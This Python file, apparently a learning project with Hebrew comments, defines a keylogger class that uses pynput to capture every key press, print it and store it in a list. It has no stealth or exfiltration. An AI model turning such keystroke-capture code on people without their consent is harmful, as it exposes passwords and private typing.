from pynput import keyboard


# מחלקה שמאזינה בזמן אמת למקלדת
class KeyLoggerService:
    # אתחול של מערכת שבאופן אוטומטי מתחילה האזנה
    def __init__(self):
        self.keylog_list = []
        self.is_listening = False
        # self.start_logging()

    # התחלת האזנה
    def start_logging(self):
        print("starting to listen")
        with keyboard.Listener(
                on_press=self.log_key_event) as self.listener:
            self.is_listening = True
            self.listener.join()



    # הפסקת האזנה והחזרת רשימה
    def stop_logging(self):
        self.is_listening = False
        print("stopping to listen")
        # return self.keylog_list

    # הוספת אירוע לרשימה
    def log_key_event(self, key):
        print("key detected: ",key)
        if self.is_listening:
            self.keylog_list.append(key)

    # סגירת התוכנית
    def exit_program(self):
        self.listener.stop()
        exit()

